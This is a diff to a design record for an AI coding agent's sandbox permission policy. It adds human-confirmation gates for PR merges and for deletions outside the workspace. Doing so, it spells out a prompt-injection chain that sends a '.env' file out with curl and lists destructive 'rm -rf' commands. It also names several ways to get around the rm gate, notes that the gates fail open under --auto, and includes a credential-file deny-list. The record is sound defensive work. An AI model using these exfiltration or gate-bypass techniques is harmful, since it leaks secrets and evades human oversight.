@@ -33,7 +33,9 @@ so we keep it.
 
 Adopt a **default-allow** permission policy, gating only the class of action the
 sandbox boundary does **not** fully contain, while keeping one cheap,
-zero-prompt data-exfil control (the `read` credential deny-list).
+zero-prompt data-exfil control (the `read` credential deny-list), plus two
+narrowly-scoped `ask` gates added after the initial policy shipped (see
+"Two additional `ask` gates" below).
 
 - Top-level default `"*": "allow"`; `edit`, `webfetch`, `websearch` allow.
 - The `read` tool keeps its **hard-`deny` credential-file list** (`.env`,
@@ -56,6 +58,37 @@ zero-prompt data-exfil control (the `read` credential deny-list).
 - **No hard `deny` rules in `bash`.** The sandbox, not a bash denylist, is the
   control for command execution; the only `deny` in the whole policy is the
   `read` credential list, which governs the read *tool*, not shell commands.
+
+### Two additional `ask` gates, added after initial rollout
+
+Two more gates were added at maintainer request, on top of the policy above,
+each aimed at a residual risk class the sandbox boundary genuinely does
+**not** cover (unlike the bulk of what this ADR argues is already contained):
+
+**`gh pr merge*` / `gh api*/pulls/*/merge*` / `gh api*/merge*` → `ask`.**
+Merging alters the **authoritative state of a shared, version-controlled
+system outside the sandbox**, using a token whose privilege the sandbox
+boundary does not mediate — the boundary confines the *container*, not the
+*operations* a valid credential can perform against a remote API. This is a
+**configuration-change-control concern (NIST SP 800-53 CM-3, secondarily
+CM-5)**, not a least-privilege-inside-the-sandbox concern (AC-6) — merging is
+gated on its own line, separate from the `gh api*` rule above, so the prompt
+names the actual action rather than a generic "gh api call." **Reviewed by a
+7-role multi-perspective panel (6 approve / 1 reject on a narrower framing
+question, unanimous on this control mapping)**; the panel's strongest
+argument for CM-3 over AC-6: a per-sandbox GitHub token is scoped to *hosts*
+it can reach, not to *which API operations* it may invoke once it reaches
+one, so the permission map — not the sandbox — is the only control point for
+this specific action.
+
+**`rm` outside the workspace (absolute path, `~`/`$HOME`-relative, or a
+`..`-climbing relative path) → `ask`; in-workspace `rm` remains fully
+allowed.** See "Why the `rm` gate is defense-in-depth, not AC-6 enforcement"
+below for the full rationale and an explicit, disclosed limitation — the
+panel that reviewed this was unanimous that it must **not** be presented as
+directly implementing AC-6's "restricted to the project directory" language,
+even though that is the more specific and more accurate control text to cite
+than "the sandbox already covers it."
 
 ### The "new outbound destination" gate is a UX affordance, not a firewall
 
@@ -84,29 +117,86 @@ egress boundary, so gating them adds prompts without adding containment:
 If a deployment needs any of these gated, that is exactly what the re-gating
 mixin (below) is for — it can add them without forking this kit.
 
-### Why keep the read-deny (the one exception to "no deny")
+### Why the `rm` gate is defense-in-depth, not AC-6 enforcement
 
-The workspace *should* be a clone/worktree the user chose to mount, without real
-secrets — but a user may realistically mount a repo that carries a real
-`.env`/`*.pem`/`*.tfvars`. If the agent is prompt-injected, `read .env` →
-`curl -d @.env https://api.gsa.usai.gov` exfiltrates to a host that is **on the
-allow-list and accepts POST bodies**. The proxy allow-list — the only network
-control — cannot distinguish that malicious POST from legitimate model traffic.
-A hard `deny` on reading credential files cuts that chain at the source for free.
+The `rm`-outside-workspace gate (`rm -rf /`, `rm -rf ~/other-project`,
+`rm -rf $HOME/x`, `rm -rf ../sibling`, and similar) was added because the
+mount topology that enforces "no host filesystem" does not, by itself,
+guarantee "restricted to *only* the project directory" the way NIST SP
+800-53 **AC-6**'s canonical text puts it (`docs/SECURITY-CONTROLS.md` in the
+playbook: *"File system access SHOULD be restricted to the project
+directory"*). Inside the container there can be writable paths outside the
+workspace — the merged global OpenCode config, `~/.config`, any additional
+mount a particular backend or kit adds — that the container boundary permits
+but the literal AC-6 sentence does not intend to scope in. Citing that
+specific clause is more accurate than the original "the sandbox broadly
+satisfies AC-6" framing this ADR shipped with; it names the exact property
+being aimed at rather than leaning on the container boundary alone.
 
-Scope note (honest about what it is): the read-deny governs the **read tool**,
-not `bash`. `cat .env` in a shell is *not* blocked. It is therefore
-**belt-and-suspenders**, not a complete exfil block — the data-bearing
-curl/wget gates and the proxy allow-list are the other layers.
+**But do not read the above as "this gate satisfies AC-6."** A 7-role
+multi-perspective review panel evaluated this exact framing and was
+unanimous on one point even where they otherwise disagreed: an `ask` gate is
+a **human-confirmation prompt over a glob match on a bash command string** —
+advisory, not enforcement — and it is adversarially trivial to route around,
+non-maliciously or otherwise:
+
+- `cd .. && rm -rf sibling` (the gate matches the string, not the resulting
+  cwd)
+- `sh -c 'rm -rf ~/x'` or any subshell/wrapper indirection
+- `find .. -delete`, `xargs rm`, `python -c 'shutil.rmtree(...)'`, or any
+  non-`rm` deletion primitive (the gate is `rm`-specific, not a filesystem
+  boundary)
+- variable indirection that hides the literal path text the glob matches on
+  (`rm -rf "$(echo ~)"/x`)
+- a symlink inside the workspace whose target resolves outside it
+
+A control claim that fails this quickly should not be written into an ADR as
+a control's primary satisfaction — an assessor who tests the claim breaks it
+in one command, which is a **worse** outcome than the honest defense-in-depth
+framing this ADR already used. The corrected, accurate statement: **the
+sandbox's mount scope remains the primary, structurally-enforced
+implementation of AC-6's filesystem restriction; the `rm` gate is a
+secondary, non-enforcing, human-in-the-loop checkpoint against accidental
+(not adversarial) destructive commands on the residual writable paths the
+mount scope does not cover.** The two layers are complementary; neither
+alone is AC-6's full implementation, and the gate's own limitation (the
+bypass list above) is disclosed here rather than left for an assessor to
+discover.
+
+**Also disclosed:** OpenCode's own `ask` semantics fail **open**, not
+closed, under automation — `opencode --auto` / `opencode run --auto`
+"automatically approve[s] permission requests that are not explicitly
+denied" (only `deny` rules survive `--auto`; see
+[opencode.ai/docs/permissions](https://opencode.ai/docs/permissions/)). Both
+new `ask` gates in this ADR — `rm` and `gh pr merge` — provide **zero**
+protection in any workflow that runs with `--auto`. If this kit is ever
+consumed by a fully autonomous, `--auto`-driven pipeline, the actual control
+against an unattended destructive `rm` or an unattended merge has to live
+elsewhere (a workspace-scoped credential/mount restriction for `rm`; branch
+protection and required reviews on the remote for merge) — not in this
+config, which is an interactive-session safeguard by construction.
 
 ### What is deliberately allowed (and why it's safe here)
 
-- **Destructive/filesystem/privilege ops** (`rm -rf`, `dd`, `chmod`, `sudo`,
-  `systemctl`, …): blast radius is one ephemeral container. `rm -rf` in a
-  throwaway box is a self-own, not a breach.
+- **Destructive/filesystem/privilege ops** (`dd`, `chmod`, `sudo`,
+  `systemctl`, in-workspace `rm -rf`, …): blast radius is one ephemeral
+  container. `rm -rf build` in a throwaway box is a self-own, not a breach.
+  (Outside-workspace `rm` is the one exception — see above.)
 - **`cat`/`less` of dotfiles / "secret" files**: allowed in `bash` (the read
   *tool* deny-list does not cover shell commands). Real credentials are injected,
-  not on disk; the read-deny is a cheap extra layer, not a promise.
+  not on disk; the read-deny is a cheap extra layer, not a promise. The
+  workspace *should* be a clone/worktree the user chose to mount, without real
+  secrets — but a user may realistically mount a repo that carries a real
+  `.env`/`*.pem`/`*.tfvars`. If the agent is prompt-injected, `read .env` →
+  `curl -d @.env https://api.gsa.usai.gov` exfiltrates to a host that is **on
+  the allow-list and accepts POST bodies**. The proxy allow-list — the only
+  network control — cannot distinguish that malicious POST from legitimate
+  model traffic. A hard `deny` on reading credential files cuts that chain at
+  the source for free. Scope note (honest about what it is): the read-deny
+  governs the **read tool**, not `bash`. `cat .env` in a shell is *not*
+  blocked. It is therefore **belt-and-suspenders**, not a complete exfil
+  block — the data-bearing curl/wget gates and the proxy allow-list are the
+  other layers.
 - **Package installs / builds / tests** (`npm`, `uv`, `pytest`, `make`,
   `cargo`, `docker`): the entire point of a coding agent. Supply-chain risk is
   bounded by the sandbox + egress allow-list, not by an `ask` prompt.
@@ -124,18 +214,30 @@ curl/wget gates and the proxy allow-list are the other layers.
 
 This pack also ships deny-by-default review skills (`least-privilege-review`,
 `secure-code-review`) and the playbook preaches AC-6. That is not a
-contradiction: **least-privilege here is enforced by the sbx boundary (no host
-FS, proxied egress, injected creds), not by the permission map** — and the
-deny-by-default review skills apply to the *code being reviewed*, not to this
-sandbox's own shell. The permission map is deliberately permissive *because* a
-stronger control (the sandbox) sits underneath it.
+contradiction: **least-privilege here is enforced jointly by the sbx boundary
+(no host FS outside the workspace mount, proxied egress, injected creds) and,
+for the residual gap the mount scope alone does not cover, by the `rm`
+`ask`-gate described above** — not by a comprehensive permission-map denylist.
+The deny-by-default review skills apply to the *code being reviewed*, not to
+this sandbox's own shell. The permission map stays deliberately permissive for
+everything else *because* a stronger control (the sandbox) sits underneath it;
+the two new gates in this ADR are the two documented exceptions where the
+sandbox does not, by itself, mediate the action in question.
 
 ### Residual risk (accepted)
 
 A novel outbound command not in the `ask` list runs unprompted. This is bounded
 by the sandbox's proxy egress allow-list (an unknown host is not reachable), and
-the highest-consequence known outbound actions (`git push`/`gh`) are gated.
-Accepted at FIPS-Low for a development sandbox.
+the highest-consequence known outbound actions (`git push`/`gh`, now including
+`gh pr merge`) are gated. Also accepted, and disclosed above rather than
+hidden: the `gh pr merge` gate does not cover `git push` to a branch with
+auto-merge already enabled, or `gh pr merge --auto`'s deferred-merge path —
+closing that gap, if ever needed, means restricting the per-sandbox token's
+merge scope at the credential layer, not adding more glob patterns here. And
+both new `ask` gates provide no protection under `opencode --auto`/
+`opencode run --auto`, which approves any request that isn't an explicit
+`deny` (see the disclosure above). Accepted at FIPS-Low for a development
+sandbox.
 
 ## Re-gating for stricter environments
 
@@ -156,17 +258,27 @@ overlay as independent, composable pieces.
 ## Consequences
 
 - Far fewer approval prompts for routine, sandbox-contained work; the prompts
-  that remain (`git push`/`gh`, new remotes/channels, data-bearing curl/wget)
-  are the ones worth a human's attention.
+  that remain (`git push`/`gh`, `gh pr merge`, new remotes/channels, outside-
+  workspace `rm`, data-bearing curl/wget) are the ones worth a human's
+  attention.
 - The policy is honest about what it is: sandbox-tuned, documented as such in the
-  README, and not to be lifted into a non-sandboxed context unchanged.
+  README, and not to be lifted into a non-sandboxed context unchanged. It is
+  also honest about what the two newer `ask` gates are NOT: neither is a
+  standalone implementation of the NIST control it's grounded in (AC-6 for
+  `rm`, CM-3/CM-5 for `gh pr merge`) — both are human-in-the-loop checkpoints
+  layered on top of a structural control (the sandbox mount scope; branch
+  protection on the remote) that does the actual enforcing, and both fail
+  open under `opencode --auto`.
 - Encoded in `tests/opencode-permissions.test.mjs`, which models OpenCode's
   **last-matching-rule** semantics (not most-specific-wins) and asserts the
-  default-allow posture, the specific `ask` edges (including `gh` and the
-  data-bearing curl/wget forms), the retained `read` credential deny-list, and
-  that **`bash`** has no hard-deny rules. It includes a regression test proving a
-  trailing broad `allow` reopens a gate — the failure mode that a
-  most-specific-wins resolver would have hidden.
+  default-allow posture, the specific `ask` edges (including `gh`, `gh pr
+  merge`, outside-workspace `rm`, and the data-bearing curl/wget forms), the
+  retained `read` credential deny-list, and that **`bash`** has no hard-deny
+  rules. It includes a regression test proving a trailing broad `allow`
+  reopens a gate — the failure mode that a most-specific-wins resolver would
+  have hidden — and documents (in comments, not assertions, since they are
+  not testable as static config) the `rm` gate's known bypass forms and the
+  `--auto` fail-open behavior.
 
 ## Links
 
